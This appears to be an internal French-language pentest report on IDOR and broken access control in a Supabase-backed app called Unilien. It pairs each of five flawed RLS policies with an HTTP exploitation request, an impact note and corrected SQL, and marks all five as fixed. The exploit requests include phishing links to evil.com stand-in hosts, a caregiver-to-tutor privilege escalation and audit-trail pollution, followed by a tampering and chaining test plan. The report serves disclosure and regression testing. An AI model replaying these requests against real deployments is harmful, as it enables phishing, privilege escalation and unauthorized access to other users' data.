# Analyse IDOR et Broken Access Control — Unilien

**Focus** : Supabase REST API, RLS Postgres, JWT, accès cross-user

> **Lecture (26/03/2026)** : ce document décrit le **constat initial** du pentest. Les correctifs sont déployés via la migration **`supabase/migrations/041_security_fixes.sql`** et résumés dans **`docs/SECURITY_CHECK_2026-03-26.md`**. Les scénarios ci-dessous restent utiles pour des **tests de non-régression** (Burp, Postman).

---

## Synthèse des vulnérabilités IDOR

| # | Titre | Sévérité | Prérequis | Statut (26/03/2026) |
|---|-------|----------|-----------|---------------------|
| 1 | INSERT notifications — `user_id` arbitraire via REST | **Critique** | Authentifié | **Corrigé** — policy `notifications_insert_own` |
| 2 | RPC `create_notification` — IDOR + action_url | **Élevé** | Authentifié | **Corrigé** — relation métier + validation `action_url` (041) |
| 3 | caregivers UPDATE — `legal_status` par l'aidant (privilege escalation) | **Critique** | Aidant | **Corrigé** — policy *limited* sur colonnes sensibles |
| 4 | conversations INSERT — employer_id arbitraire + participant_ids | **Moyen** | Authentifié | **Corrigé** — policy réécrite (`employer_id` / contrats / aidants) |
| 5 | file_upload_audit INSERT — pollution du trail d'audit | **Faible** | Authentifié | **Corrigé** — plus d'INSERT `authenticated` arbitraire |

---

## 1. [CRITIQUE] INSERT notifications — user_id arbitraire via REST

### Policy défaillante

```sql
-- 004_fix_notifications_rls.sql L25-28
CREATE POLICY "notifications_insert" ON public.notifications
  FOR INSERT TO authenticated
  WITH CHECK ((select auth.uid()) IS NOT NULL);
```

Le seul critère est `auth.uid() IS NOT NULL`. Il n’y a **aucune vérification** que `user_id` de la ligne correspond à `auth.uid()`.

### Exploitation

**Étape 1** : Se connecter (n’importe quel compte).

**Étape 2** : Insérer une notification pour un autre utilisateur :

```http
POST /rest/v1/notifications HTTP/1.1
Host: <PROJECT_REF>.supabase.co
Content-Type: application/json
apikey: <ANON_KEY>
Authorization: Bearer <ACCESS_TOKEN>
Prefer: return=representation

{
  "user_id": "uuid-victime-arbitraire",
  "type": "system",
  "title": "Spam",
  "message": "Contenu malveillant",
  "priority": "high",
  "action_url": "https://evil.com/phishing"
}
```

**Étape 3** : La victime reçoit la notification (in-app + push).

### Impact

- Spam / harcèlement ciblé
- Phishing via `action_url` non validé
- Déni de service (nombreux messages)

### Policy correcte

```sql
-- Ne permettre l’INSERT que pour ses propres notifications
DROP POLICY "notifications_insert" ON public.notifications;
CREATE POLICY "notifications_insert" ON public.notifications
  FOR INSERT TO authenticated
  WITH CHECK (auth.uid() = user_id);
```

Pour les notifications cross-user, passer uniquement par une Edge Function ou une RPC qui impose une logique métier (employeur → employé, etc.) avant insert.

#### Statut (26/03/2026)

Policy **`notifications_insert_own`** : `WITH CHECK (auth.uid() = user_id)` — voir **`041_security_fixes.sql`** (section P1-1).

---

## 2. [ÉLEVÉ] RPC create_notification — IDOR sans relation métier

### Fonction

```sql
-- 004_fix_notifications_rls.sql L42-74
CREATE OR REPLACE FUNCTION create_notification(
  p_user_id uuid, p_type text, p_title text, p_message text,
  p_priority text DEFAULT 'normal', p_data jsonb DEFAULT '{}'::jsonb,
  p_action_url text DEFAULT NULL  -- NON VALIDÉ
)
...
  INSERT INTO notifications (user_id, type, title, message, priority, data, action_url)
  VALUES (p_user_id, p_type, p_title, p_message, p_priority, p_data, p_action_url)
```

Tout utilisateur authentifié peut appeler la RPC. Aucune vérification de relation (employeur/employé/aidant, etc.).

### Exploitation

```http
POST /rest/v1/rpc/create_notification HTTP/1.1
Host: <PROJECT_REF>.supabase.co
Content-Type: application/json
apikey: <ANON_KEY>
Authorization: Bearer <ACCESS_TOKEN>

{
  "p_user_id": "uuid-any-user",
  "p_type": "shift_reminder",
  "p_title": "Rappel",
  "p_message": "Cliquez pour voir",
  "p_action_url": "https://evil.com/steal-credentials"
}
```

### Correction

- Réduire l’usage de la RPC : passer par une Edge Function.
- Dans la RPC (si conservée) : valider que l’appelant a une relation légitime avec `p_user_id` (contract, caregiver, etc.).
- Valider `p_action_url` : uniquement chemins relatifs same-origin (ex. `/planning?date=...`).

#### Statut (26/03/2026)

Fonction **`create_notification`** remplacée dans **`041_security_fixes.sql`** (P1-2) : vérification de relation métier avec `p_user_id`, validation stricte de `p_action_url` (chemins relatifs ; rejet `javascript:`, `data:`, URLs absolues, etc.).

---

## 3. [CRITIQUE] caregivers — privilege escalation via legal_status

### Policies conflictuelles

```sql
-- 008: L’aidant peut modifier son propre enregistrement
CREATE POLICY "Caregivers can update their own profile"
ON caregivers FOR UPDATE
USING (profile_id = auth.uid())
WITH CHECK (profile_id = auth.uid());

-- 007: L’employeur peut modifier ses aidants
CREATE POLICY "Employers can update their caregivers"
ON caregivers FOR UPDATE
USING (auth.uid() = employer_id) ...
```

En RLS, les policies d’une même opération sont combinées en OR. Un aidant peut donc utiliser la première policy et modifier **tous** les champs, dont `legal_status`.

### Exploitation

```http
PATCH /rest/v1/caregivers?profile_id=eq.<MON_UUID> HTTP/1.1
Host: <PROJECT_REF>.supabase.co
Content-Type: application/json
apikey: <ANON_KEY>
Authorization: Bearer <ACCESS_TOKEN>

{"legal_status": "tutor"}
```

Résultat : droits tuteur/curateur (accès planning, contrats, absences, documents, bulletins).

### Correction

Exclure `legal_status` de la policy d’auto-mise à jour :

```sql
-- Nouvelle policy limitée aux champs autorisés
CREATE POLICY "Caregivers can update own profile limited"
ON caregivers FOR UPDATE
USING (profile_id = auth.uid())
WITH CHECK (
  profile_id = auth.uid()
  AND legal_status IS NOT DISTINCT FROM (SELECT legal_status FROM caregivers c WHERE c.profile_id = auth.uid())
);
```

Ou une policy qui interdit toute modification de `legal_status` par un aidant sur lui-même.

#### Statut (26/03/2026)

Policy **`Caregivers can update own profile limited`** dans **`041_security_fixes.sql`** (P0-1) : `legal_status`, `employer_id`, `permissions`, `permissions_locked` ne peuvent pas être modifiés en self-service par l’aidant.

---

## 4. [MOYEN] conversations — employer_id arbitraire

### Policy

```sql
-- 035_add_conversations.sql L53-58
CREATE POLICY "Users can create conversations" ON public.conversations
  FOR INSERT
  WITH CHECK (
    auth.uid() = employer_id
    OR auth.uid() = ANY(participant_ids)
  );
```

Avec `auth.uid() = ANY(participant_ids)`, on passe la policy en mettant notre UUID dans `participant_ids`, même si `employer_id` est un autre employeur.

### Exploitation

```http
POST /rest/v1/conversations HTTP/1.1
Host: <PROJECT_REF>.supabase.co
Content-Type: application/json
apikey: <ANON_KEY>
Authorization: Bearer <ACCESS_TOKEN>
Prefer: return=representation

{
  "employer_id": "uuid-employeur-victime",
  "type": "private",
  "participant_ids": ["mon-uuid", "uuid-employe-victime"]
}
```

Impact : création d’une conversation « privée » dans l’espace d’un autre employeur, avec nous et la victime comme participants. Apparition d’une conversation non sollicitée côté victime.

### Correction

```sql
-- Imposer que employer_id soit l’appelant
CREATE POLICY "Users can create conversations" ON public.conversations
  FOR INSERT
  WITH CHECK (
    auth.uid() = employer_id
    AND (auth.uid() = ANY(participant_ids) OR EXISTS (
      SELECT 1 FROM contracts
      WHERE employer_id = conversations.employer_id
        AND employee_id = ANY(conversations.participant_ids)
        AND status = 'active'
    ))
  );
```

Ou logique similaire pour limiter les créations aux employeurs et à leurs équipes.

#### Statut (26/03/2026)

Policy **`Users can create conversations`** réécrite dans **`041_security_fixes.sql`** (P2-1) : `employer_id` doit correspondre à l’appelant ou à un lien métier (contrat actif, aidant même employeur).

---

## 5. [FAIBLE] file_upload_audit — pollution du trail d’audit

### Policy

```sql
-- 013_add_backend_validation.sql L71-73
CREATE POLICY "Service role can insert audit entries"
  ON file_upload_audit FOR INSERT
  WITH CHECK (true);
```

`WITH CHECK (true)` autorise tout INSERT si la policy s’applique au rôle utilisé.

### Exploitation

```http
POST /rest/v1/file_upload_audit HTTP/1.1
Host: <PROJECT_REF>.supabase.co
Content-Type: application/json
apikey: <ANON_KEY>
Authorization: Bearer <ACCESS_TOKEN>

{
  "user_id": "uuid-arbitraire",
  "bucket_id": "justifications",
  "file_path": "fake/path.pdf",
  "file_name": "fake.pdf",
  "mime_type": "application/pdf",
  "file_size": 0,
  "operation": "INSERT"
}
```

Impact : corruption du trail d’audit, faux positifs en forensique.

### Correction

- Réserver les inserts à un rôle service (backend / Edge Function), pas à `authenticated`.
- Ou retirer toute policy INSERT pour les clients et n’insérer que via triggers/fonctions SECURITY DEFINER.

#### Statut (26/03/2026)

Ancienne policy **`Service role can insert audit entries`** supprimée dans **`041_security_fixes.sql`** (P2-2) : plus d’INSERT `authenticated` avec `WITH CHECK (true)` ; écritures réservées aux rôles/privilèges appropriés.

---

## Tables sans IDOR identifié

| Table | SELECT | INSERT | UPDATE | DELETE |
|-------|--------|--------|--------|--------|
| profiles | OK (own + relations) | OK (trigger) | OK (own) | N/A |
| employers | OK | OK (own) | OK | N/A |
| employees | OK | OK (own) | OK | N/A |
| contracts | OK | OK (employer/tuteur) | OK | OK |
| shifts | OK | OK (contract) | OK | OK |
| absences | OK | OK (employee_id = auth) | OK | OK |
| log_entries | OK | OK (employer/employee/caregiver) | OK | OK |
| liaison_messages | OK | OK (sender + relation) | OK (author) | OK (author) |
| push_subscriptions | OK (own) | OK (user_id = auth) | OK (own) | OK (own) |
| leave_balances | OK | OK (employer) | OK (employer) | OK (employer) |
| notification_preferences | OK (own) | OK (own) | OK (own) | OK (own) |

---

## Stratégies de test (Burp / Postman)

### Parameter tampering

- Remplacer `user_id`, `employer_id`, `employee_id`, `profile_id`, `sender_id` par des UUID d’autres utilisateurs.
- Tester `PATCH` et `PUT` avec des champs sensibles (`legal_status`, `role`, `permissions`).

### Filtres abusifs

- `.or()` : `?or=(user_id.eq.victim,user_id.eq.other)` pour tenter d’élargir le périmètre.
- `.in()` : énumérer des UUIDs pour voir si des enregistrements non autorisés sont retournés.

### Enumération d’IDs

- UUID v4 : peu prévisibles, mais récupérables via fuites (notifications, messages, URLs).
- Lister les tables retournant des UUID (profiles, contracts, shifts, etc.) et tester avec des IDs d’autres utilisateurs.

### Chaînage après accès initial

1. IDOR notifications → phishing via `action_url`.
2. Escalade caregiver → tuteur → accès complet employeur.
3. Conversations arbitraires → apparition de conversations non sollicitées.

---

## Références

- Rapport principal : `docs/SECURITY_PENTEST_REPORT.md`
- Artifacts : `docs/SECURITY_PENTEST_ARTIFACTS.md`
- Revue post-correctifs : `docs/SECURITY_CHECK_2026-03-26.md`
- Migration : `supabase/migrations/041_security_fixes.sql`
